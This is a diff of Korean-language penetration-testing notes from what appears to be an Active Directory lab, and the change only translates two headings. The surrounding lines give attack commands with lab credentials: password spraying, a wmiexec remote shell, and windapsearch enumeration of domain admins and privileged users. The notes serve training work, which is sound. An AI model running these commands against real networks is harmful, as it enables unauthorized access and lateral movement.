@@ -182,10 +182,10 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 ```wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5```<br/>
 : SYSTEM이 아닌 사용자 계정으로 쉘 실행, 은밀하지만 cmd.exe 생성 로그가 남음
 
-### Windapsearch - Domain Admins
+### Windapsearch - 도메인 관리자 그룹 구성원 열거 
 ```python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da```
 
-### Windapsearch - Privileged Users
+### Windapsearch - 권한이 있는 사용자 찾기
 ```python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU```
 
 ### BloodHound.py 실행
